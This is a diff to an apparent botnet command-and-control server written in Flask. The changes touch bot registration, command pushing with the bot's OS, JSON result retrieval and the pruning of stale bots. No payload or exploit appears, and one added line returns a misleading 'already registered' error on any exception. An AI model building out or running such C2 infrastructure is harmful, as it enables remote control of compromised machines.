@@ -215,6 +215,7 @@ def register():
         query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(pid=bot_pid).first()
     except Exception as e:
         print("[!]", e)
+        return jsonify({'result': 'fail', 'error': 'Bot already registered'})
 
     if query_bot is not None:
         return jsonify({'result': 'fail', 'error': 'Bot already registered'})
@@ -312,7 +313,7 @@ def botpush(target):
         else:
             query_bot = Bot.query.filter_by(id=bot_id).first()
 
-        cmd = Command(cmd, query_bot.id, query_bot.ip)
+        cmd = Command(cmd, query_bot.id, query_bot.ip, query_bot.os)
         print(cmd)
 
         # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
@@ -427,15 +428,16 @@ def botresult(bot_id):
                 command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
                 #print("[DEBUG] command info = ", command.get_info())
                 
-                result = command.result
+                json_command = command.jsoncommand()
 
                 #query_bot.cmds.remove(command)
                 db.session.commit()
 
-                if result is None:
+                if command.result is None:
                     return jsonify({'error': 'Bot have not called back'})
                 else:
-                    return result 
+                    #print(json_command)
+                    return Response(json.dumps(json_command), mimetype='application/json') 
 
             except Exception as e:
                 return jsonify({ 'error': str(e) })
@@ -487,7 +489,7 @@ def botlist():
     for bot in botlist:
         if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
             db.session.delete(bot)
-    db.session.commit()
+            db.session.commit()
 
     jsonbotlist = []
 
